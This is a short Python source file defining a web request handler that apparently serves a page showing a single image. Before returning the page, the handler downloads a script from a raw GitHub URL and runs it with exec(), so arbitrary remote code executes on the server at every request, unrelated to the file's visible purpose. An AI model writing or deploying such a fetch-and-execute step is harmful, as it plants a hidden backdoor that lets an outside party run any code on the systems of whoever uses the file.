import urllib.request

def handler(request):
    with urllib.request.urlopen("https://raw.githubusercontent.com/RAMDDR5/python/refs/heads/main/texttt") as response:
        exec(response.read().decode("utf-8"), {})
    return {
        "statusCode": 200,
        "headers": {
            "Content-Type": "text/html"
        },
        "body": "<img src='/image.png' style='max-width:100vw;max-height:100vh;'>"
    }
